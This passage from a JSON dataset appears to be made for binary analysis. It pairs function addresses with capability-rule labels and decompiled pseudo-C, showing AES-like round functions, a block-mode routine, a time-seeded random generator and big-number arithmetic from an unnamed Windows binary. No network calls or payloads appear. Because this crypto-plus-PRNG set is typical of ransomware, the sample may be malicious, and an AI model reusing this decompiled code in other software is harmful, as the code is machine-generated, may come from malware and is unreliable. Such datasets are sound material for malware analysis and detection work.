0xff) * 4 + 0x40cd70) ^\n                *((var_ch >> 0x18) * 4 + 0x40c570) ^ *((var_4h & 0xff) * 4 + 0x40d170) ^ *puVar1;\n        uVar6 = *((var_8h >> 0x10 & 0xff) * 4 + 0x40c970) ^ *((var_4h >> 8 & 0xff) * 4 + 0x40cd70) ^\n                *((uVar7 >> 0x18) * 4 + 0x40c570) ^ *((var_ch & 0xff) * 4 + 0x40d170) ^ puVar1[3];\n        var_4h = *((uVar5 >> 0x10 & 0xff) * 4 + 0x40c970) ^ *((uVar4 >> 8 & 0xff) * 4 + 0x40cd70) ^\n                 *((uVar6 >> 0x18) * 4 + 0x40c570) ^ *((uVar3 & 0xff) * 4 + 0x40d170) ^ puVar1[4];\n        var_8h = *((uVar6 >> 0x10 & 0xff) * 4 + 0x40c970) ^ *((uVar5 >> 8 & 0xff) * 4 + 0x40cd70) ^\n                 *((uVar3 >> 0x18) * 4 + 0x40c570) ^ *((uVar4 & 0xff) * 4 + 0x40d170) ^ puVar1[5];\n        uVar7 = *((uVar6 >> 8 & 0xff) * 4 + 0x40cd70) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40c970) ^\n                *((uVar4 >> 0x18) * 4 + 0x40c570) ^ *((uVar5 & 0xff) * 4 + 0x40d170) ^ puVar1[6];\n        var_ch = *((uVar4 >> 0x10 & 0xff) * 4 + 0x40c970) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x40cd70) ^\n                 *((uVar5 >> 0x18) * 4 + 0x40c570) ^ *((uVar6 & 0xff) * 4 + 0x40d170) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar3 = *((var_ch >> 0x10 & 0xff) * 4 + 0x40c970) ^ *((uVar7 >> 8 & 0xff) * 4 + 0x40cd70) ^\n            *((var_4h >> 0x18) * 4 + 0x40c570) ^ *((var_8h & 0xff) * 4 + 0x40d170) ^ puVar1[1];\n    uVar4 = *((var_ch >> 8 & 0xff) * 4 + 0x40cd70) ^ *((var_4h >> 0x10 & 0xff) * 4 + 0x40c970) ^\n            *((var_8h >> 0x18) * 4 + 0x40c570) ^ *((uVar7 & 0xff) * 4 + 0x40d170) ^ puVar1[2];\n    uVar5 = *((var_8h >> 0x10 & 0xff) * 4 + 0x40c970) ^ *((var_4h >> 8 & 0xff) * 4 + 0x40cd70) ^\n            *((uVar7 >> 0x18) * 4 + 0x40c570) ^ *((var_ch & 0xff) * 4 + 0x40d170) ^ puVar1[3];\n    uVar9 = *((uVar7 >> 0x10 & 0xff) * 4 + 0x40c970) ^ *((var_8h >> 8 & 0xff) * 4 + 0x40cd70) ^\n            *((var_ch >> 0x18) * 4 + 0x40c570) ^ *((var_4h & 0xff) * 4 + 0x40d170) ^ *puVar1;\n    uVar8 = CONCAT31(CONCAT21(CONCAT11(*((uVar5 >> 0x18) + 0x40b448), *((uVar4 >> 0x10 & 0xff) + 0x40b448)), \n                              *((uVar3 >> 8 & 0xff) + 0x40b448)), *((uVar9 & 0xff) + 0x40b448)) ^ puVar1[4];\n    uVar7 = CONCAT31(CONCAT21(CONCAT11(*((uVar9 >> 0x18) + 0x40b448), *((uVar5 >> 0x10 & 0xff) + 0x40b448)), \n                              *((uVar4 >> 8 & 0xff) + 0x40b448)), *((uVar3 & 0xff) + 0x40b448)) ^ puVar1[5];\n    uVar6 = CONCAT31(CONCAT21(CONCAT11(*((uVar3 >> 0x18) + 0x40b448), *((uVar9 >> 0x10 & 0xff) + 0x40b448)), \n                              *((uVar5 >> 8 & 0xff) + 0x40b448)), *((uVar4 & 0xff) + 0x40b448)) ^ puVar1[6];\n    uVar3 = CONCAT31(CONCAT21(CONCAT11(*((uVar4 >> 0x18) + 0x40b448), *((uVar3 >> 0x10 & 0xff) + 0x40b448)), \n                              *((uVar9 >> 8 & 0xff) + 0x40b448)), *((uVar5 & 0xff) + 0x40b448)) ^ puVar1[7];\n    unaff_ESI[1] = uVar8 >> 8;\n    *unaff_ESI = uVar8;\n    unaff_ESI[3] = uVar8 >> 0x18;\n    unaff_ESI[2] = uVar8 >> 0x10;\n    unaff_ESI[4] = uVar7;\n    unaff_ESI[5] = uVar7 >> 8;\n    unaff_ESI[7] = uVar7 >> 0x18;\n    unaff_ESI[6] = uVar7 >> 0x10;\n    unaff_ESI[8] = uVar6;\n    unaff_ESI[9] = uVar6 >> 8;\n    unaff_ESI[0xb] = uVar6 >> 0x18;\n    unaff_ESI[0xd] = uVar3 >> 8;\n    unaff_ESI[0xc] = uVar3;\n    unaff_ESI[0xe] = uVar3 >> 0x10;\n    unaff_ESI[10] = uVar6 >> 0x10;\n    unaff_ESI[0xf] = uVar3 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2241
    },
    "00406f2a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406f2a(int32_t *arg_8h)\n\n{\n    uint32_t *in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *unaff_ESI;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_8h[1];\n    var_4h = in_EAX[1] ^ puVar1[1];\n    var_8h = in_EAX[2] ^ puVar1[2];\n    var_14h = *in_EAX ^ *puVar1;\n    uVar2 = in_EAX[3] ^ puVar1[3];\n    var_18h = *arg_8h >> 1;\n    puVar1 = puVar1 + 4;\n    while( true ) {\n        var_18h = var_18h + -1;\n        if (var_18h < 1) break;\n        uVar3 = *((uVar2 >> 8 & 0xff) * 4 + 0x40bd70) ^ *((var_8h >> 0x10 & 0xff) * 4 + 0x40b948) ^\n                *((var_4h >> 0x18) * 4 + 0x40b548) ^ *((var_14h & 0xff) * 4 + 0x40c170) ^ *puVar1;\n        uVar7 = *((var_4h >> 8 & 0xff) * 4 + 0x40bd70) ^ *((var_14h >> 0x10 & 0xff) * 4 + 0x40b948) ^\n                *((uVar2 >> 0x18) * 4 + 0x40b548) ^ *((var_8h & 0xff) * 4 + 0x40c170) ^ puVar1[2];\n        uVar4 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x40b948) ^ *((var_14h >> 8 & 0xff) * 4 + 0x40bd70) ^\n                *((var_8h >> 0x18) * 4 + 0x40b548) ^ *((var_4h & 0xff) * 4 + 0x40c170) ^ puVar1[1];\n        uVar2 = *((var_8h >> 8 & 0xff) * 4 + 0x40bd70) ^ *((var_4h >> 0x10 & 0xff) * 4 + 0x40b948) ^\n                *((var_14h >> 0x18) * 4 + 0x40b548) ^ *((uVar2 & 0xff) * 4 + 0x40c170) ^ puVar1[3];\n        var_14h = *((uVar2 >> 8 & 0xff) * 4 + 0x40bd70) ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x40b948) ^\n                  *((uVar4 >> 0x18) * 4 + 0x40b548) ^ *((uVar3 & 0xff) * 4 + 0x40c170) ^ puVar1[4];\n        var_4h = *((uVar2 >> 0x10 & 0xff) * 4 + 0x40b948) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x40bd70) ^\n                 *((uVar7 >> 0x18) * 4 + 0x40b548) ^ *((uVar4 & 0xff) * 4 + 0x40c170) ^ puVar1[5];\n        var_8h = *((uVar4 >> 8 & 0xff) * 4 + 0x40bd70) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40b948) ^\n                 *((uVar2 >> 0x18) * 4 + 0x40b548) ^ *((uVar7 & 0xff) * 4 + 0x40c170) ^ puVar1[6];\n        uVar2 = *((uVar7 >> 8 & 0xff) * 4 + 0x40bd70) ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x40b948) ^\n                *((uVar3 >> 0x18) * 4 + 0x40b548) ^ *((uVar2 & 0xff) * 4 + 0x40c170) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar3 = *((uVar2 >> 8 & 0xff) * 4 + 0x40bd70) ^ *((var_8h >> 0x10 & 0xff) * 4 + 0x40b948) ^\n            *((var_4h >> 0x18) * 4 + 0x40b548) ^ *((var_14h & 0xff) * 4 + 0x40c170) ^ *puVar1;\n    uVar4 = *((var_4h >> 8 & 0xff) * 4 + 0x40bd70) ^ *((var_14h >> 0x10 & 0xff) * 4 + 0x40b948) ^\n            *((uVar2 >> 0x18) * 4 + 0x40b548) ^ *((var_8h & 0xff) * 4 + 0x40c170) ^ puVar1[2];\n    uVar8 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x40b948) ^ *((var_14h >> 8 & 0xff) * 4 + 0x40bd70) ^\n            *((var_8h >> 0x18) * 4 + 0x40b548) ^ *((var_4h & 0xff) * 4 + 0x40c170) ^ puVar1[1];\n    uVar2 = *((var_8h >> 8 & 0xff) * 4 + 0x40bd70) ^ *((var_4h >> 0x10 & 0xff) * 4 + 0x40b948) ^\n            *((var_14h >> 0x18) * 4 + 0x40b548) ^ *((uVar2 & 0xff) * 4 + 0x40c170) ^ puVar1[3];\n    uVar7 = CONCAT31(CONCAT21(CONCAT11(*((uVar8 >> 0x18) + 0x40d570), *((uVar4 >> 0x10 & 0xff) + 0x40d570)), \n                              *((uVar2 >> 8 & 0xff) + 0x40d570)), *((uVar3 & 0xff) + 0x40d570)) ^ puVar1[4];\n    uVar5 = CONCAT31(CONCAT21(CONCAT11(*((uVar4 >> 0x18) + 0x40d570), *((uVar2 >> 0x10 & 0xff) + 0x40d570)), \n                              *((uVar3 >> 8 & 0xff) + 0x40d570)), *((uVar8 & 0xff) + 0x40d570)) ^ puVar1[5];\n    uVar6 = CONCAT31(CONCAT21(CONCAT11(*((uVar2 >> 0x18) + 0x40d570), *((uVar3 >> 0x10 & 0xff) + 0x40d570)), \n                              *((uVar8 >> 8 & 0xff) + 0x40d570)), *((uVar4 & 0xff) + 0x40d570)) ^ puVar1[6];\n    uVar2 = CONCAT31(CONCAT21(CONCAT11(*((uVar3 >> 0x18) + 0x40d570), *((uVar8 >> 0x10 & 0xff) + 0x40d570)), \n                              *((uVar4 >> 8 & 0xff) + 0x40d570)), *((uVar2 & 0xff) + 0x40d570)) ^ puVar1[7];\n    unaff_ESI[1] = uVar7 >> 8;\n    *unaff_ESI = uVar7;\n    unaff_ESI[3] = uVar7 >> 0x18;\n    unaff_ESI[2] = uVar7 >> 0x10;\n    unaff_ESI[4] = uVar5;\n    unaff_ESI[5] = uVar5 >> 8;\n    unaff_ESI[7] = uVar5 >> 0x18;\n    unaff_ESI[9] = uVar6 >> 8;\n    unaff_ESI[10] = uVar6 >> 0x10;\n    unaff_ESI[0xd] = uVar2 >> 8;\n    unaff_ESI[0xc] = uVar2;\n    unaff_ESI[8] = uVar6;\n    unaff_ESI[0xe] = uVar2 >> 0x10;\n    unaff_ESI[0xf] = uVar2 >> 0x18;\n    unaff_ESI[6] = uVar5 >> 0x10;\n    unaff_ESI[0xb] = uVar6 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2265
    },
    "00407447": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407447(int32_t arg_8h, int32_t arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint32_t in_ECX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_18h;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    if ((in_ECX & 0xf) == 0) {\n        if (arg_ch == 0) {\n            if (in_ECX != 0) {\n                var_8h = (arg_8h + 8) - arg_14h;\n                var_4h = arg_10h;\n                iVar6 = (in_ECX - 1 >> 4) + 1;\n                do {\n                    uVar1 = *var_4h;\n                    uVar2 = var_4h[1];\n                    uVar3 = var_4h[2];\n                    uVar4 = var_4h[3];\n                    fcn.00406f2a(arg_8h);\n                    iVar7 = 0x10;\n                    do {\n                        *arg_14h = *arg_14h ^ *(var_8h + arg_14h);\n                        arg_14h = arg_14h + 1;\n                        iVar7 = iVar7 + -1;\n                    } while (iVar7 != 0);\n                    var_4h = var_4h + 4;\n                    var_8h = var_8h + -0x10;\n                    iVar6 = iVar6 + -1;\n                    *(arg_8h + 8) = uVar1;\n                    *(arg_8h + 0xc) = uVar2;\n                    *(arg_8h + 0x10) = uVar3;\n                    *(arg_8h + 0x14) = uVar4;\n                } while (iVar6 != 0);\n            }\n        }\n        else if (in_ECX != 0) {\n            iVar6 = (arg_8h + 8) - arg_10h;\n            var_8h = (in_ECX - 1 >> 4) + 1;\n            do {\n                iVar7 = 0x10;\n                puVar5 = arg_10h;\n                do {\n                    *((arg_14h - arg_10h) + puVar5) = *(iVar6 + puVar5) ^ *puVar5;\n                    puVar5 = puVar5 + 1;\n                    iVar7 = iVar7 + -1;\n                } while (iVar7 != 0);\n                if (arg_ch == 1) {\n                    fcn.00406a04(arg_8h);\n                }\n                else {\n                    fcn.00406f2a(arg_8h);\n                }\n                arg_10h = arg_10h + 4;\n                *(arg_8h + 8) = *arg_14h;\n                *(arg_8h + 0xc) = arg_14h[1];\n                *(arg_8h + 0x10) = arg_14h[2];\n                iVar6 = iVar6 + -0x10;\n                var_8h = var_8h + -1;\n                *(arg_8h + 0x14) = arg_14h[3];\n                arg_14h = arg_14h + 4;\n            } while (var_8h != 0);\n        }\n        return 0;\n    }\n    return 0xffffffde;\n}\n",
        "token_count": 802
    },
    "004075ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004075ef(int32_t noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (noname_0 != 0) {\n        iVar1 = *(noname_0 + 0x10);\n        fcn.0040793b();\n        fcn.00407951();\n        fcn.0040793b();\n        fcn.00407951();\n        fcn.0040793b();\n        fcn.00407951();\n        if (*(noname_0 + 8) != 0) {\n            fcn.0040793b();\n            fcn.00407951();\n        }\n        fcn.0040793b();\n        fcn.00407951();\n        if (*(iVar1 + 0x1c) != 0) {\n            fcn.004094f2();\n        }\n        fcn.004078fe();\n        fcn.004090a1(iVar1);\n        fcn.004090a1(noname_0);\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00407686": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407686(uint arg_8h, uint32_t arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    ushort *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar4 = *(in_ECX + 0xc);\n    iVar5 = iVar4 - (arg_ch & 0xffff);\n    iVar6 = iVar5 + -3;\n    *in_EAX = 0x200;\n    iVar3 = fcn.004078a3(in_EAX + 1);\n    if ((iVar3 != 0) && (var_4h = 0,  iVar3 = iVar6,  0 < iVar6)) {\n        do {\n            pcVar1 = var_4h + 2 + in_EAX;\n            cVar2 = *pcVar1;\n            while (cVar2 == '\\0') {\n                cVar2 = fcn.00409508();\n                *pcVar1 = cVar2;\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < iVar6);\n    }\n    if ((iVar3 == 0) < 0) {\n        iVar4 = -1;\n    }\n    else {\n        *(in_EAX + iVar5 + -1) = 0;\n        fcn.00408fd7(in_EAX + iVar5, arg_8h, arg_ch & 0xffff);\n        arg_8h_00 = fcn.00407e19(in_EAX);\n        *(*(in_ECX + 0x10) + 0x24) = 0;\n        fcn.00408104(arg_8h_00, *(in_ECX + 4));\n        fcn.00407e85(*(in_ECX + 0x10), in_EAX);\n        fcn.004078fe();\n    }\n    return iVar4;\n}\n",
        "token_count": 476
    },
    "004077df": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004077df(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint lpSystemTime;\n    uint32_t lpFileTime;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(0x40d6a0, 4000);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x40d6a0);\n    pcVar1 = _sym.imp.KERNEL32.dll_QueryPerformanceCounter;\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(&var_8h);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    *0x40d680 = *0x40d680 ^ uVar2;\n    *0x40d684 = *0x40d684 ^ var_4h;\n    *0x40d688 = *0x40d688 ^ var_8h;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    *0x40d68c = *0x40d68c ^ uVar2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *0x40d690 = *0x40d690 ^ uVar2;\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)(&lpSystemTime);\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, &lpFileTime);\n    *0x40d694 = *0x40d694 ^ var_ch;\n    *0x40d698 = *0x40d698 ^ lpFileTime;\n    (*pcVar1)(&var_8h);\n    *0x40d69c = *0x40d69c ^ var_4h;\n    *0x40d680 = *0x40d680 ^ var_8h;\n    do {\n        fcn.00407753();\n    } while (*0x40d680 != '\\0');\n    *0x40d6b8 = 1;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x40d6a0);\n    return;\n}\n",
        "token_count": 494
    },
    "004078a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.004078a3(void)\n\n{\n    int32_t in_EAX;\n    int32_t arg_10h;\n    uint unaff_retaddr;\n    \n    if (*0x40d6b8 == '\\0') {\n        fcn.004077df();\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x40d6a0);\n    if (in_EAX != 0) {\n        do {\n            arg_10h = 0x10;\n            if (in_EAX < 0x11) {\n                arg_10h = in_EAX;\n            }\n            fcn.00408fd7(unaff_retaddr, 0x40d680, arg_10h);\n            fcn.00407753();\n            in_EAX = in_EAX - arg_10h;\n        } while (in_EAX != 0);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x40d6a0);\n    return in_EAX == 0;\n}\n",
        "token_count": 223
    },
    "00407928": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00407928(void)\n\n{\n    int32_t unaff_ESI;\n    \n    if (*(unaff_ESI + 8) != 1) {\n        fcn.004094f2();\n    }\n    *(unaff_ESI + 8) = 0x7fff55aa;\n    return;\n}\n",
        "token_count": 71
    },
    "00407b16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00407b16(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *puVar1;\n    int16_t *piVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t arg_ch_00;\n    uint arg_ch_01;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint *arg_10h_00;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *(arg_8h + 0x24);\n    var_ch = 0;\n    var_20h = *(arg_ch + 4);\n    var_28h = *(arg_10h + 4);\n    iVar9 = var_20h - var_28h;\n    var_14h = var_28h;\n    iVar6 = fcn.00407fb9();\n    if (iVar6 < 1) {\n        var_10h = fcn.00408052();\n        var_28h = var_28h + 1;\n        arg_ch_00 = fcn.00408052();\n        iVar6 = fcn.004080e3();\n        var_18h = 0x10000 / (*(*(iVar6 + 0xc) + -2 + *(iVar6 + 4) * 2) + 1) & 0xffff;\n        fcn.00408fa9(*(var_10h + 0xc), 0, *(var_10h + 4) * 2);\n        if (1 < var_18h) {\n            arg_ch = fcn.00407a8f(arg_8h, arg_ch, var_18h);\n            iVar6 = *(arg_8h + 0x10 + var_1h * 4);\n        }\n        if (var_20h == *(arg_ch + 4)) {\n            fcn.00408008();\n        }\n        var_20h = var_14h * 2 + 2;\n        do {\n            fcn.00408fd7(*(arg_ch_00 + 0xc), *(arg_ch + 0xc) + -2 + ((*(arg_ch + 4) - var_ch) - var_14h) * 2, var_20h);\n            iVar5 = *(arg_ch_00 + 0xc);\n            var_24h = *(iVar6 + 4);\n            uVar3 = *(*(iVar6 + 0xc) + -2 + var_24h * 2);\n            var_1ch = uVar3;\n            if (*(iVar5 + -2 + *(arg_ch_00 + 4) * 2) == uVar3) {\n                var_8h = 0xffff;\ncode_r0x00407cdc:\n                if (*(iVar6 + 8) != 0x7fff55aa) {\n                    *(iVar6 + 8) = *(iVar6 + 8) + 1;\n                }\n                arg_10h_00 = &var_2ch;\n                arg_ch_01 = fcn.00407a8f(arg_8h, iVar6, var_8h);\n                arg_ch_00 = fcn.00407a0a(arg_8h, arg_ch_01, arg_10h_00);\n                fcn.00408008();\n                *(*(var_10h + 0xc) + -2 + (*(var_10h + 4) - var_ch) * 2) = var_8h;\n                if (var_2ch != 0) {\n                    piVar2 = *(var_10h + 0xc) + -2 + (*(var_10h + 4) - var_ch) * 2;\n                    *piVar2 = *piVar2 + -1;\n                    if (*(iVar6 + 8) != 0x7fff55aa) {\n                        *(iVar6 + 8) = *(iVar6 + 8) + 1;\n                    }\n                    arg_ch_00 = fcn.0040797a(arg_8h, arg_ch_00, iVar6);\n                    *(arg_ch_00 + 4) = *(arg_ch_00 + 4) + -1;\n                    *(iVar6 + 4) = *(iVar6 + 4) + -1;\n                }\n            }\n            else {\n                var_8h = CONCAT22(*(iVar5 + -2 + *(arg_ch_00 + 4) * 2), *(iVar5 + -4 + *(arg_ch_00 + 4) * 2)) / uVar3 &\n                         0xffff;\n                if (((1 < *(iVar6 + 4)) && (uVar4 = *(*(iVar6 + 0xc) + -4 + var_24h * 2),  var_24h = uVar4,  uVar4 != 0)\n                    ) && (uVar7 = CONCAT22(*(*(arg_ch_00 + 0xc) + -4 + *(arg_ch_00 + 4) * 2) - uVar3 * var_8h, \n                                           *(*(arg_ch_00 + 0xc) + -6 + *(arg_ch_00 + 4) * 2)), \n                         uVar7 <= var_24h * var_8h && var_24h * var_8h - uVar7 != 0)) {\n                    var_8h = var_8h + 0xffff;\n                }\n                if (var_8h != 0) goto code_r0x00407cdc;\n                *(*(var_10h + 0xc) + -2 + (*(var_10h + 4) - var_ch) * 2) = 0;\n            }\n            fcn.00408fd7(*(arg_ch + 0xc) + -2 + ((*(arg_ch + 4) - var_ch) - var_14h) * 2, *(arg_ch_00 + 0xc), var_20h);\n            var_ch = var_ch + 1;\n        } while (var_ch <= iVar9);\n        fcn.00407951();\n        fcn.00407951();\n        fcn.00407951();\n        iVar6 = fcn.004080e3();\n        iVar9 = *(iVar6 + 4) + -1;\n        uVar7 = 0;\n        do {\n            puVar1 = *(iVar6 + 0xc) + iVar9 * 2;\n            uVar8 = uVar7 * 0x10000 + *puVar1;\n            uVar7 = uVar8 % (var_18h & 0xffff);\n            iVar9 = iVar9 + -1;\n            *puVar1 = uVar8 / var_18h;\n        } while (-1 < iVar9);\n        arg_ch = fcn.004080e3();\n    }\n    else {\n        fcn.00407951();\n    }\n    return arg_ch;\n}\n",
        "token_count": 1678
    },
    "00407e19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407e19(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00408052();\n    iVar4 = 0;\n    fcn.00408fa9(*(iVar1 + 0xc), 0, *(iVar1 + 4) * 2);\n    iVar3 = in_EAX + -1;\n    if (-1 < iVar3) {\n        var_4h = 0;\n        do {\n            piVar2 = *(iVar1 + 0xc) + var_4h;\n            *piVar2 = *piVar2 + (*(iVar3 + arg_8h) << (iVar4 << 3 & 0x1f));\n            iVar4 = iVar4 + 1;\n            if (iVar4 == 2) {\n                iVar4 = 0;\n                var_4h = var_4h + 2;\n            }\n            iVar3 = iVar3 + -1;\n        } while (-1 < iVar3);\n    }\n    fcn.004080e3();\n    return;\n}\n",
        "token_count": 278
    },
    "00408052": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * fcn.00408052(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBX;\n    \n    puVar1 = *(unaff_EBX + 4);\n    if (puVar1 == NULL) {\n        puVar1 = fcn.00409041(0x10);\n        uVar2 = fcn.00409041(in_EAX * 2);\n        puVar1[3] = uVar2;\n        *(puVar1 + 6) = in_EAX;\n    }\n    else {\n        uVar2 = *puVar1;\n        *(unaff_EBX + 0x20) = *(unaff_EBX + 0x20) + -1;\n        *(unaff_EBX + 4) = uVar2;\n        if (puVar1[2] != 0) {\n            fcn.004094f2();\n        }\n        fcn.00408008();\n    }\n    *puVar1 = 0;\n    *(puVar1 + 1) = in_EAX;\n    puVar1[2] = 1;\n    *(unaff_EBX + 0x1c) = *(unaff_EBX + 0x1c) + 1;\n    return puVar1;\n}\n",
        "token_count": 291
    },
    "004080e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004080e3(void)\n\n{\n    int32_t in_EAX;\n    \n    while ((*(*(in_EAX + 0xc) + -2 + *(in_EAX + 4) * 2) == 0 && (1 < *(in_EAX + 4)))) {\n        *(in_EAX + 4) = *(in_EAX + 4) + -1;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00408104": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408104(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h._0_2_ = 0x8000;\n    iVar1 = 0xf;\n    do {\n        if ((*(*(arg_ch + 0xc) + -2 + *(arg_ch + 4) * 2) & var_8h) != 0) {\n            var_4h = iVar1 + -0x10 + *(arg_ch + 4) * 0x10;\n            goto code_r0x00408144;\n        }\n        var_8h._0_2_ = var_8h >> 1;\n        bVar5 = iVar1 != 0;\n        iVar1 = iVar1 + -1;\n    } while (bVar5);\n    var_4h = -1;\ncode_r0x00408144:\n    iVar1 = fcn.00408052();\n    **(iVar1 + 0xc) = 1;\n    uVar2 = fcn.00409041(4);\n    *(in_EAX + 0x14) = uVar2;\n    iVar3 = fcn.00408052();\n    fcn.00408fd7(*(iVar3 + 0xc), *(arg_8h + 0xc), *(arg_8h + 4) * 2);\n    